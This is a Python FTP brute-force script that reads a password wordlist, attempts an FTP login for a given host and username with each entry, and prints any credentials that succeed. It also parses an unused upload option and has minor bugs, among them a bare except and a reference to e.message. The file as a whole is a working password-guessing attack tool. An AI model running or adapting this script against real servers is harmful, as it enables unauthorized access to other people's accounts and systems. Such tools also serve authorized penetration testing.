from ftplib import FTP 
from sys import exit
import os
import socket
import argparse
from termcolor import colored

def banner():
    print('''

______ ___________  ______                    
|  ___|_   _| ___ \ |  _  \                   
| |_    | | | |_/ / | | | |_____      ___ __  
|  _|   | | |  __/  | | | / _ \ \ /\ / / '_ \ 
| |     | | | |     | |/ / (_) \ V  V /| | | |
\_|     \_/ \_|     |___/ \___/ \_/\_/ |_| |_|
                                              
[+]Developer    - Gabriel Dutra(T9++)
[+]Linkedin     - linkedin.com/in/gmdutra
    ''')

def check(host, username, passwd):

    try:
        ftp = FTP(host)
        ftp.login(username, passwd)

        print_result(host, username, passwd)
        return 1
    except:
        #print (colored(f"[+] user={username} - pass={passwd} - FALIED\r", end="", red))
        print (colored(f"[+] user={username} - pass={passwd} - FALIED", 'red'))
def loadWordlist(host, username, wordlist):

    try:
        wd = open(wordlist, "r")
        read = wd.readlines()
        
        for line in read:
            line = line.strip()
            check(host, username, line)

    except Exception as e:
        print(f"Error: {e.message}")
        exit(1)

def print_result(host, username, passwd):

    print (colored(f'''
-------------------------------------------
            Login successful
-------------------------------------------
[+]Host     = {host}                       
[+]Username = {username}                   
[+]Password = {passwd}                     
-------------------------------------------
        ''', 'blue'))

def main():

    parser = argparse.ArgumentParser(description="ftp brute force")
    parser.add_argument('--host',     action="store", dest="host",      required=True)
    parser.add_argument("--user",     action="store", dest="user",      required=True)
    parser.add_argument("--wordlist", action="store", dest="wordlist",  required=True)
    parser.add_argument("--upload",   action="store", dest="upload",    required=False)

    given_args = parser.parse_args()

    host     = given_args.host
    user     = given_args.user
    wordlist = given_args.wordlist
    upload   = given_args.upload

    loadWordlist(host, user, wordlist)
    
if __name__ == '__main__':
    banner()
    main()    
